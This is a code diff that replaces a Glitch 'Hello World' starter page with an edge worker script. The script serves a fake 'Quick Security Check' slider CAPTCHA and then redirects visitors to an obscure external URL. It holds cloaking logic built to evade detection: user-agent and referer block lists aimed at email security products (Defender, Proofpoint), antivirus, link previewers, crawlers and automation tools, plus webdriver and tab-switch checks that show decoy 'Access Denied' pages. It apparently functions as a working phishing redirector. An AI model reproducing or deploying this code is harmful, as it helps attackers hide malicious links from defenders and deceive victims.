@@ -1,56 +1,228 @@
-<!DOCTYPE html>
+addEventListener("fetch", event => {
+  event.respondWith(handleRequest(event.request));
+});
+
+const DESTINATION_URL = "https://officeautopart.modernatlethicsvirtualist.org/f/79bbd11c4b03"; // change if needed
+
+// Block obvious bots/scanners
+const BLOCK_UA_PATTERNS = [
+  /defender|proofpoint|antivirus|scanner|crawl|bot|headless|phantom|fetch/i,
+  /facebook|discord|preview|proxy|spider|scraper|automation|linkpreview/i,
+  /puppeteer|selenium|playwright|webdriver|chrome-lighthouse|chromium/i,
+  /curl|wget|postman|insomnia|httpie|axios|okhttp|apache-httpclient/i,
+  /python|nodejs|java|php|ruby|perl|go\/|rust|dotnet|powershell/i,
+  /twitterbot|facebookexternalhit|whatsapp|telegrambot|slackbot/i,
+  /googlebot|bingbot|yandexbot|baiduspider|duckduckbot|semrush|ahrefs/i,
+  /amazonaws|googlecloud|azure|datadog|pingdom|newrelic|uptimerobot/i,
+  /headlesschrome|phantomjs|slimerjs|htmlunit|zombie|mechanize/i
+];
+
+const BLOCK_REFERER_PATTERNS = [
+  /facebook|discord|preview|proxy|bot|crawler|scanner/i,
+  /t\.co|bit\.ly|tinyurl|short|goo\.gl|ow\.ly|buff\.ly/i,
+  /spam|malware|phishing|suspicious|blocked/i
+];
+
+const SUSPICIOUS_FEATURES = {
+  minUserAgentLength: 15,
+  minInteractionTime: 1500,
+  maxSolveTime: 180000,
+  requiredDragDistance: 80,
+  minMouseEvents: 3
+};
+
+function isBlocked(headers) {
+  const ua = (headers.get("User-Agent") || "").toLowerCase();
+  const referer = (headers.get("Referer") || "").toLowerCase();
+
+  if (!ua || ua.length < SUSPICIOUS_FEATURES.minUserAgentLength) return true;
+  if (BLOCK_UA_PATTERNS.some(r => r.test(ua))) return true;
+  if (referer && BLOCK_REFERER_PATTERNS.some(r => r.test(referer))) return true;
+
+  return false;
+}
+
+async function handleRequest(req) {
+  if (isBlocked(req.headers)) {
+    return new Response(
+      "<!doctype html><html><head><meta name=\"robots\" content=\"noindex\"><title>Access Denied</title></head><body style=\"font-family:sans-serif;text-align:center;padding:48px;\"><h2>🚫 Access Denied</h2><p>This secure verification is no longer available.</p><p style=\"font-size:12px;color:#666;\">Advanced security systems have detected suspicious activity.</p></body></html>",
+      { headers: { "Content-Type": "text/html" } }
+    );
+  }
+
+  const referenceId = (typeof crypto !== "undefined" && crypto.randomUUID)
+    ? crypto.randomUUID()
+    : ("ref-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 8));
+
+  if (req.method === "POST") {
+    const html =
+      "<!doctype html><html><head><meta charset=\"utf-8\"><title>Redirecting…</title>" +
+      "<meta http-equiv=\"refresh\" content=\"0;url=" + DESTINATION_URL + "\">" +
+      "<script>window.location.replace(" + JSON.stringify(DESTINATION_URL) + ");</script>" +
+      "</head><body></body></html>";
+    return new Response(html, { headers: { "Content-Type": "text/html" } });
+  }
+
+  return new Response(renderSliderVerification(referenceId), {
+    headers: { "Content-Type": "text/html; charset=utf-8" }
+  });
+}
+
+function renderSliderVerification(refId) {
+  return `<!doctype html>
 <html lang="en">
-
 <head>
-  <!-- 
-      This is an HTML comment
-      You can write text in a comment and the content won't be visible in the page
-    -->
-
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link rel="icon" href="https://glitch.com/favicon.ico" />
-
-  <!--
-      This is the page head - it contains info the browser uses
-      Like the title, which appears on the browser tab but not inside the page
-      Further down you'll see the content that displays in the page
-    -->
-  <title>Hello World!</title>
-
-  <!-- The website stylesheet -->
-  <link rel="stylesheet" href="/style.css" />
-
-  <!-- The website JavaScript file -->
-  <script src="/script.js" defer></script>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta name="robots" content="noindex,nofollow" />
+<title>Quick Verification</title>
+<style>
+  :root{--accent:#4f46e5;--bg:#f8fafc;--card:#fff;--success:#10b981}
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
+  body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;align-items:center;justify-content:center;padding:20px}
+  .card{width:550px;max-width:100%;background:var(--card);border-radius:20px;box-shadow:0 25px 80px rgba(0,0,0,0.35);padding:40px}
+  .icon{width:48px;height:48px;margin:0 auto 20px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:12px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:24px}
+  h1{text-align:center;font-size:28px;color:#0f172a;font-weight:700;margin-bottom:8px}
+  p.lead{text-align:center;color:#64748b;font-size:15px;margin-bottom:32px}
+  .instruction{text-align:center;font-weight:600;color:#4f46e5;margin-bottom:28px;font-size:15px;padding:14px;background:linear-gradient(135deg,#eef2ff,#e0e7ff);border-radius:12px}
+  .slider-container{position:relative;margin:40px 0}
+  .slider-track{height:64px;background:linear-gradient(to right,#e2e8f0,#cbd5e1);border-radius:999px;position:relative;overflow:hidden;box-shadow:inset 0 2px 8px rgba(0,0,0,0.1)}
+  .slider-progress{position:absolute;left:0;top:0;height:100%;background:linear-gradient(to right,#667eea,#764ba2);border-radius:999px;transition:width 0.2s ease-out;pointer-events:none}
+  .slider-thumb-container{position:absolute;left:0;top:0;height:100%;transition:left 0.2s ease-out;pointer-events:none}
+  .slider-thumb{width:56px;height:56px;background:#fff;border-radius:999px;box-shadow:0 4px 12px rgba(0,0,0,0.15);display:flex;align-items:center;justify-content:center;font-size:24px;border:4px solid #667eea;transform:translateX(-50%);cursor:grab;user-select:none}
+  .slider-thumb:active{cursor:grabbing;transform:translateX(-50%) scale(1.05)}
+  input[type="range"]{position:absolute;inset:0;width:100%;height:100%;opacity:0;cursor:pointer;z-index:10}
+  input[type="range"]::-webkit-slider-thumb{width:56px;height:56px;cursor:pointer}
+  input[type="range"]::-moz-range-thumb{width:56px;height:56px;cursor:pointer}
+  .hint{text-align:center;color:#64748b;font-size:14px;margin-top:16px}
+  .success{text-align:center;padding:32px 0;display:none}
+  .success-icon{width:64px;height:64px;margin:0 auto 16px;background:var(--success);border-radius:999px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:32px;animation:pop 0.4s ease-out}
+  .success-text{font-size:20px;font-weight:700;color:var(--success);margin-bottom:8px}
+  .success-subtext{color:#64748b}
+  @keyframes pop{0%{transform:scale(0)}50%{transform:scale(1.1)}100%{transform:scale(1)}}
+  .ref{margin-top:32px;padding-top:20px;border-top:1px solid #e2e8f0;color:#94a3b8;font-size:11px;text-align:center}
+  @media (max-width:600px){.card{padding:28px}h1{font-size:24px}.slider-track{height:56px}.slider-thumb{width:48px;height:48px}}
+</style>
 </head>
-
 <body>
-  <!--
-      The body includes the content you see in the page
-      Each element is defined using tags, like this <div></div>
-      The attributes like class="wrapper" let us style elements in the CSS
-    -->
-  <div class="wrapper">
-    <div class="content" role="main">
-      <h1 class="title">Oh hi website!</h1>
-      <img src="/cool-website.svg" class="illustration" alt="cool website" />
-      <div class="instructions">
-        <p>
-          Fork <a href="https://github.com/glitchdotcom/website-to-compute">this project</a> and open it in a GitHub Codespace.
-        </p>
-        <p> Follow the steps in the README to deploy your new website to Fastly in a few steps!
-        </p>
+  <div class="card" role="main">
+    <div id="verificationView">
+      <div class="icon">🛡️</div>
+      <h1>Quick Security Check</h1>
+      <p class="lead">Please complete this verification</p>
 
+      <div class="instruction">👉 Slide to verify you're human</div>
+
+      <div class="slider-container">
+        <div class="slider-track">
+          <div class="slider-progress" id="sliderProgress"></div>
+          <div class="slider-thumb-container" id="thumbContainer">
+            <div class="slider-thumb">→</div>
+          </div>
+          <input type="range" min="0" max="100" value="0" id="sliderInput" />
+        </div>
       </div>
 
-      <footer class="footer">
-        <div>
-          <a class="remix" href="https://github.com/glitchdotcom/website-to-compute">🚧 Get your own site</a>
-        </div>
-      </footer>
+      <div class="hint">Slide the button all the way to the right</div>
     </div>
-  </div>
-</body>
 
-</html>
+    <div class="success" id="successView">
+      <div class="success-icon">✓</div>
+      <p class="success-text">Verification Complete!</p>
+      <p class="success-subtext">Loading...</p>
+    </div>
+
+    <div class="ref">Reference ID: ${refId}</div>
+  </div>
+
+<script>
+(function(){
+  var slider = document.getElementById('sliderInput');
+  var progress = document.getElementById('sliderProgress');
+  var thumbContainer = document.getElementById('thumbContainer');
+  var verificationView = document.getElementById('verificationView');
+  var successView = document.getElementById('successView');
+
+  var startTime = Date.now();
+  var mouseEvents = 0;
+  var totalDistance = 0;
+  var lastValue = 0;
+  var isVerified = false;
+
+  function performSecurityChecks() {
+    if (window.webdriver || window.phantom || window.callPhantom ||
+        navigator.webdriver || document.documentElement.getAttribute('webdriver') ||
+        window._selenium || window.__webdriver_evaluate) {
+      blockAccess('Automated environment detected');
+      return false;
+    }
+    if (!window.localStorage || !window.sessionStorage) {
+      blockAccess('Missing browser features');
+      return false;
+    }
+    return true;
+  }
+
+  function blockAccess(reason) {
+    document.body.innerHTML =
+      '<div style="text-align:center;padding:50px;font-family:sans-serif;background:#fff;border-radius:16px;margin:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);">' +
+      '<div style="font-size:64px;margin-bottom:20px;">🚫</div>' +
+      '<h2 style="color:#ef4444;margin-bottom:12px;">Access Denied</h2>' +
+      '<p style="color:#64748b;margin-bottom:8px;">This secure verification is no longer available.</p>' +
+      '<p style="font-size:12px;color:#94a3b8;">Reason: ' + reason + '</p>' +
+      '</div>';
+  }
+
+  function validateHumanBehavior() {
+    var timeSpent = Date.now() - startTime;
+    if (timeSpent < 1500) { blockAccess('Solved too quickly'); return false; }
+    if (timeSpent > 180000) { blockAccess('Session timeout'); return false; }
+    if (totalDistance < 80) { blockAccess('Insufficient interaction'); return false; }
+    if (mouseEvents < 3) { blockAccess('Insufficient mouse events'); return false; }
+    return true;
+  }
+
+  slider.addEventListener('input', function() {
+    var value = parseInt(this.value, 10) || 0;
+    mouseEvents++;
+
+    var distance = Math.abs(value - lastValue);
+    totalDistance += distance;
+    lastValue = value;
+
+    progress.style.width = value + '%';
+    thumbContainer.style.left = value + '%';
+
+    if (value >= 95 && !isVerified) {
+      if (validateHumanBehavior() && performSecurityChecks()) {
+        isVerified = true;
+        slider.disabled = true;
+        verificationView.style.display = 'none';
+        successView.style.display = 'block';
+
+        setTimeout(function () {
+          fetch(window.location.href, { method: 'POST', credentials: 'same-origin' })
+            .then(function () { window.location.replace('${DESTINATION_URL}'); })
+            .catch(function () { window.location.replace('${DESTINATION_URL}'); });
+        }, 1200 + Math.random() * 800);
+      }
+    }
+  });
+
+  document.addEventListener('visibilitychange', function() {
+    if (document.hidden && !isVerified) {
+      blockAccess('Tab switching during verification');
+    }
+  });
+
+  setTimeout(function() {
+    if (!performSecurityChecks()) {
+      blockAccess('Security validation failed');
+    }
+  }, 1000 + Math.random() * 1000);
+})();
+</script>
+</body>
+</html>`;
+}
